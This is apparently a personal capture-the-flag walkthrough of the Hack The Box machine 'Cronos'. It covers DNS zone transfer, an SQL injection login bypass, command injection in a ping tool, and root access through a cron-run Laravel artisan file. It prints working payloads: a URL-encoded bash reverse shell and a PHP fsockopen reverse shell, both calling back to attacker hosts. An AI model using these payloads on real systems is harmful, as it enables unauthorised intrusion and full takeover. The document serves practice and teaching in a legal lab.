---
description: 08/01/2022
---

# Cronos (Medium)

10.129.227.211

#### Nmap:

[nmapAutomator.sh](http://nmapautomator.sh) -H 10.129.227.211 All

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

#### Recon of web server:

* The web server at [http://10.129.227.211](http://10.129.227.211) is a default Apache2 webserver
* running 2.4.18

#### Dirsearch:

```
Target: <http://10.129.227.211/>

[20:17:12] Starting: 
[20:17:16] 403 -  300B  - /.ht_wsr.txt
[20:17:16] 403 -  303B  - /.htaccess.bak1
[20:17:16] 403 -  303B  - /.htaccess.orig
[20:17:16] 403 -  305B  - /.htaccess.sample
[20:17:16] 403 -  303B  - /.htaccess.save
[20:17:16] 403 -  303B  - /.htaccess_orig
[20:17:16] 403 -  301B  - /.htaccessBAK
[20:17:16] 403 -  304B  - /.htaccess_extra
[20:17:16] 403 -  301B  - /.htaccess_sc
[20:17:16] 403 -  301B  - /.htaccessOLD
[20:17:16] 403 -  302B  - /.htaccessOLD2
[20:17:16] 403 -  294B  - /.html
[20:17:16] 403 -  293B  - /.htm
[20:17:16] 403 -  303B  - /.htpasswd_test
[20:17:16] 403 -  299B  - /.htpasswds
[20:17:16] 403 -  300B  - /.httr-oauth
[20:17:16] 403 -  293B  - /.php
[20:17:16] 403 -  294B  - /.php3
[20:17:28] 200 -   11KB - /index.html
[20:17:34] 403 -  302B  - /server-status
[20:17:34] 403 -  303B  - /server-status/
```

#### We find nothing initially, let’s enumerate DNS via port 53:

NSLOOKUP

```
nslookup                                   Tue 02 Aug 2022 08:24:42 PM EDT
> server 127.0.0.1
Default server: 127.0.0.1
Address: 127.0.0.1#53
> server 10.129.227.211
Default server: 10.129.227.211
Address: 10.129.227.211#53
> 10.129.227.211
211.227.129.10.in-addr.arpa     name = ns1.cronos.htb.
>
```

* We discover cronos.htb

#### Let’s continue our DNS enumeration:

DIG

```
dig axfr cronos.htb @10.129.227.211

; <<>> DiG 9.18.1-1-Debian <<>> axfr cronos.htb @10.129.227.211
;; global options: +cmd
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.             604800  IN      NS      ns1.cronos.htb.
cronos.htb.             604800  IN      A       10.10.10.13
admin.cronos.htb.       604800  IN      A       10.10.10.13
ns1.cronos.htb.         604800  IN      A       10.10.10.13
www.cronos.htb.         604800  IN      A       10.10.10.13
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 40 msec
;; SERVER: 10.129.227.211#53(10.129.227.211) (TCP)
;; WHEN: Tue Aug 02 20:40:32 EDT 2022
;; XFR size: 7 records (messages 1, bytes 203)
```

#### We discover two additional subdomains, let’s add them to /etc/hosts:

* admin.cronos.htb
* ns1.cronos.htb

#### Dirsearch of cronos.htb

```
Target: <http://cronos.htb/>

[20:47:32] Starting: 
[20:47:32] 301 -  305B  - /js  ->  <http://cronos.htb/js/>                   
[20:47:34] 403 -  296B  - /.ht_wsr.txt                                     
[20:47:34] 403 -  299B  - /.htaccess.bak1                                  
[20:47:34] 403 -  299B  - /.htaccess.save
[20:47:34] 403 -  299B  - /.htaccess.orig
[20:47:34] 403 -  301B  - /.htaccess.sample
[20:47:34] 403 -  300B  - /.htaccess_extra
[20:47:34] 403 -  299B  - /.htaccess_orig
[20:47:34] 403 -  297B  - /.htaccess_sc
[20:47:34] 403 -  298B  - /.htaccessOLD2                                   
[20:47:34] 403 -  289B  - /.htm
[20:47:34] 403 -  290B  - /.html
[20:47:34] 403 -  297B  - /.htaccessOLD
[20:47:34] 403 -  297B  - /.htaccessBAK
[20:47:34] 403 -  295B  - /.htpasswds
[20:47:34] 403 -  299B  - /.htpasswd_test
[20:47:34] 403 -  296B  - /.httr-oauth
[20:47:34] 403 -  289B  - /.php                                            
[20:47:34] 403 -  290B  - /.php3                                           
[20:47:46] 301 -  306B  - /css  ->  <http://cronos.htb/css/>                  
[20:47:48] 200 -    0B  - /favicon.ico                                      
[20:47:49] 200 -    2KB - /index.php                                        
[20:47:50] 200 -  924B  - /js/                                              
[20:47:57] 200 -   24B  - /robots.txt                                       
[20:47:58] 403 -  299B  - /server-status/                                   
[20:47:58] 403 -  298B  - /server-status                                    
[20:48:02] 200 -  914B  - /web.config
```

* Laravel is running on this webserver

![Visual of cronos.htb](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/63a8a97f-b829-488e-bafd-989055429188/Untitled.png)

Visual of cronos.htb

#### web.config seems to be the only thing that is lucrative from the dirsearch results:

```
<configuration>
  <system.webServer>
    <rewrite>
      <rules>
        <rule name="Imported Rule 1" stopProcessing="true">
          <match url="^(.*)/$" ignoreCase="false" />
          <conditions>
            <add input="{REQUEST_FILENAME}" matchType="IsDirectory" ignoreCase="false" negate="true" />
          </conditions>
          <action type="Redirect" redirectType="Permanent" url="/{R:1}" />
        </rule>
        <rule name="Imported Rule 2" stopProcessing="true">
          <match url="^" ignoreCase="false" />
          <conditions>
            <add input="{REQUEST_FILENAME}" matchType="IsDirectory" ignoreCase="false" negate="true" />
            <add input="{REQUEST_FILENAME}" matchType="IsFile" ignoreCase="false" negate="true" />
          </conditions>
          <action type="Rewrite" url="index.php" />
        </rule>
      </rules>
    </rewrite>
  </system.webServer>
</configuration>
```

* However, I am unable to find anything useful from this at first.

#### Dirsearch of admin.cronos.htb:

```
Target: <http://admin.cronos.htb/>

[20:46:54] Starting: 
[20:46:57] 403 -  302B  - /.ht_wsr.txt                                     
[20:46:58] 403 -  305B  - /.htaccess.bak1                                  
[20:46:58] 403 -  305B  - /.htaccess.orig
[20:46:58] 403 -  305B  - /.htaccess.save
[20:46:58] 403 -  307B  - /.htaccess.sample
[20:46:58] 403 -  305B  - /.htaccess_orig
[20:46:58] 403 -  303B  - /.htaccess_sc
[20:46:58] 403 -  306B  - /.htaccess_extra
[20:46:58] 403 -  303B  - /.htaccessBAK
[20:46:58] 403 -  303B  - /.htaccessOLD
[20:46:58] 403 -  304B  - /.htaccessOLD2                                   
[20:46:58] 403 -  296B  - /.html
[20:46:58] 403 -  295B  - /.htm
[20:46:58] 403 -  305B  - /.htpasswd_test
[20:46:58] 403 -  302B  - /.httr-oauth
[20:46:58] 403 -  301B  - /.htpasswds
[20:46:58] 403 -  295B  - /.php                                            
[20:46:58] 403 -  296B  - /.php3                                           
[20:47:10] 200 -    0B  - /config.php                                       
[20:47:14] 200 -    2KB - /index.php/login/                                 
[20:47:14] 200 -    2KB - /index.php                                        
[20:47:16] 302 -    0B  - /logout.php  ->  index.php                        
[20:47:22] 403 -  304B  - /server-status                                    
[20:47:22] 403 -  305B  - /server-status/
```

* config.php does not have any data in it unfortunately.

![Login page for admin.cronos.htb](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d6a48ef1-a94e-4cc3-8c03-caaaea65aa97/Untitled.png)

Login page for admin.cronos.htb

* Since we see a login page, I automatically attempt SQLi

[The Ultimate SQL Injection Cheat Sheet](https://www.hackingloops.com/sql-injection-cheat-sheet/)

* username: admin' or 1=1 or ''=’
* password: password

```
admin'  or 1=1 or ''='
```

![SQLi Successful Attempt](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/9ee2c035-9eb8-404d-91ce-dd68dd8674bc/Untitled.png)

SQLi Successful Attempt

#### We gain access to welcome.php

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/204100cb-2e39-40fb-a110-5774a4447785/Untitled.png)

* We see that there is a command line tool on the home page and hopefully we can successfully communicate with our device via ping:

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6311416e-b328-4283-8542-e008ed01adef/Untitled.png)

* We can confirm that the web app can communicate with our host via tcpdump:

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b8e4dcb0-9272-4483-be82-2cd73b0ed2e8/Untitled.png)

* Confirmed communications to host from targetted web app

#### Let’s capture the request in OWASP ZAP:

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6643fe21-2aab-45c1-8516-5a6e4448a398/Untitled.png)

* We see a glaring issue in regard to how the web server is handling the execution of commands
* If we can modify the request in burp and then send it back to the server, we will be able to get malicious with this webapp!!!

![POST paramaters](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/7d035dc8-6495-4ca1-9081-b3337ac35c8f/Untitled.png)

POST paramaters

![Confirmed command execution](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/99a881a8-00f8-41ba-991a-459114fc7f80/Untitled.png)

Confirmed command execution

* Since we can pass commands through POST parameters to the victim via web app, let’s try to put in a reverse shell and start a net cat listener

#### POST Parameters for ZAP:

![Attempt 1](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/87561a1f-d16f-4d2a-a75b-3c0f0112b5c5/Untitled.png)

Attempt 1

![No connection](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/00b37ad1-3277-4f3f-ba1e-525060a1d2d9/Untitled.png)

No connection

* I believe this did not work because we need to URL encode the payload before passing it on to the web app.

![Attempt 2 was successful](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/713ad597-24ea-45c4-b58a-31c28b41b4ce/Untitled.png)

Attempt 2 was successful

#### POST Parameters Attempt 2 (SUCCESS)

* Utilizing our “Hack Tricks” web extension, we can quickly craft a payload for our Bash reverse shell.
* We must then use URL Encode and Decode for it to work properly.
  * Also, ensure the you select “Encode each line separately”

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/3e506e7f-dff0-4eef-b26a-46995d636bf5/Untitled.png)

[URL Encode and Decode - Online](https://www.urlencoder.org/)

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6baf9f36-1ebd-4211-b72c-0d19d0ce4e98/Untitled.png)

```
command=bash%20-c%20%27exec%20bash%20-i%20%26%3E%2Fdev%2Ftcp%2F10.10.14.4%2F1337%20%3C%261%27&host=
```

Attempt 2 was successful

![URL-encoded payload seen in ZAP (POST Parameters)](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c21a493b-cf26-42e6-9fed-a823d6da2710/Untitled.png)

URL-encoded payload seen in ZAP (POST Parameters)

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/49b7b10a-576e-4480-8915-1faac4e72b45/Untitled.png)

* Successful connection to our netcat listener indicates successful foothold to victim

#### Upgrade out shell to give it TTY:

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

#### File Enumeration upon Foothold:

*   We notice a config.php

    ```
    cat config.php
    <?php
       define('DB_SERVER', 'localhost');
       define('DB_USERNAME', 'admin');
       define('DB_PASSWORD', 'kEjdbRigfBHUREiNSDs');
       define('DB_DATABASE', 'admin');
       $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
    ```
* We get credentials:
  * Username: admin
  * Password: kEjdbRigfBHUREiNSDs
* Perhaps we need to enumerate the internally running services and check what is going on!

```
netstat -ano 

/usr/sbin/mysqld
```

#### Linpeas Output:

```
* * * * *       root    php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
cronos.hackthebox.gr
127.0.0.1:3306          0.0.0.0:*               LISTEN
lrwxrwxrwx 1 root root 31 Apr  9  2017 /etc/apache2/sites-enabled/laravel.conf -> ../sites-available/laravel.conf

<https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-shell-sessions>
/tmp/tmux-33
```

#### MySQL Enumeration:

```
mysql -u admin -p
password: kEjdbRigfBHUREiNSDs

show databases;
information_schema
admin

use admin;
users
```

* This ended up going nowhere unfortunately — Rabbit hole 1

#### Privilege Escalation:

* I ended up going back to the linpeas output and it ended up being the cronjob that was vulnerable to command execution.
*   I simply deleted artisan found within /var/www/laravel and replaced it with the same name artisan and added a 3 liner PHP reverse shell:

    ```
    <?php

    $sock=fsockopen("10.10.14.76",1234);exec("/bin/sh -i <&3 >&3 2>&3");

    ?>
    ```
* chmod +x artisan — this changes the permissions of the file to execute upon cronjob.
* I then started a netcat listener on port 1234 and waited one minute for the cronjob to execute on the victim host.

```
nc -lnvp 1234                                              4.6m  Wed 03 Aug 2022 07:19:53 PM EDT
listening on [any] 1234 ...
connect to [10.10.14.76] from (UNKNOWN) [10.129.80.144] 60898
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
#
```

#### ROOOOOOOOOT!
